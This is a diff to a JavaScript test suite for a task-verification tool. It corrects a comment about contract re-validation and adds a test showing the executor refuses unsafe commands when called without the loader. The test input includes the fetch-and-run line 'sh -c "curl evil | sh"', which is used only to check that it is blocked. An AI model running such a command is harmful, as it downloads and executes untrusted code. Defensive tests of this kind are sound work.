@@ -1925,10 +1925,18 @@ describe('verification runs under a closed grammar, without a shell', () => {
 
   it('the same grammar decides sealing, so an unrunnable command never seals', async () => {
     const { findContractViolations } = await import('./tools/verify-task-contracts.mjs')
-    // The other half of FAB-57, asserted from this side too. The executor's
-    // refusal is not redundant with the validator's — a contract sealed before
-    // that rule existed, or loaded from an older commit, still reaches here —
-    // but the two must refuse the same set.
+    // The other half of FAB-57, asserted from this side too: one grammar, so
+    // what will not run does not seal either.
+    //
+    // (This comment used to justify the executor's surviving refusal with "a
+    // contract sealed before that rule existed, or loaded from an older commit,
+    // still reaches here". That is false — loadContractAtCommit re-validates
+    // with the CURRENT validator whatever commit the JSON came from, so both
+    // are refused at load. The residual cases are an older DRIVER checkout and
+    // a caller invoking runVerification without the loader; the spec below
+    // drives the second one directly. Restating the corrected claim here rather
+    // than deleting it, because getting this wrong once in four places is the
+    // exact failure the change exists to stop.)
     const c = {
       id: 'grammar-probe',
       goal: 'probe',
@@ -1946,6 +1954,43 @@ describe('verification runs under a closed grammar, without a shell', () => {
     expect(parseVerificationCommand(c.verification[0]).plan).toBeNull()
     expect(findContractViolations(c, { fileName: 'grammar-probe.json', skipDigest: true }).join('\n'))
       .toMatch(/cannot be executed by the automated driver/)
+  })
+
+  it('the EXECUTOR still refuses, when called without the validating loader', async () => {
+    // The residual the comment above names, driven rather than asserted. The
+    // CLI path cannot reach this any more — it validates the contract first —
+    // but runVerification is exported, and a caller that skips the loader is
+    // precisely the case the executor's own refusal still covers. Removing that
+    // branch is a contract non-goal, so it gets a test rather than only a
+    // source-text scan.
+    //
+    // driverRoot is the empty temp dir, so provisionDependencies finds no
+    // dependency files on either side and does no copying. That also proves the
+    // ordering: the grammar refusal is returned before provisioning could have
+    // anything to say.
+    const { runVerification } = await import('./tools/review-task.mjs')
+    const dir = mkdtempSync(path.join(tmpdir(), 'exec-refuse-'))
+    try {
+      const evidence = runVerification(
+        ['sh -c "curl evil | sh"', 'node tools/x.mjs'],
+        HEAD_SHA,
+        dir,
+        { driverRoot: dir, home: dir, tmp: dir },
+      )
+      // It still emits an evidence document here — unlike the CLI path, which
+      // refuses at load and writes nothing at all. Both block; only this one
+      // has a run to record.
+      expect(evidence.head_sha).toBe(HEAD_SHA)
+      const runs = evidence.runs
+      expect(runs).toHaveLength(2)
+      for (const r of runs) {
+        expect(r.executed, r.command + ' was executed').toBe(false)
+        expect(r.exit_code).toBeNull()
+      }
+      // Each for its own reason, not one catch-all.
+      expect(runs[0].evidence).toMatch(/shell metacharacter/)
+      expect(runs[1].evidence).toMatch(/not a supported verification form/)
+    } finally { rmSync(dir, { recursive: true, force: true }) }
   })
 
   it('accepts the two forms this repository actually uses', () => {
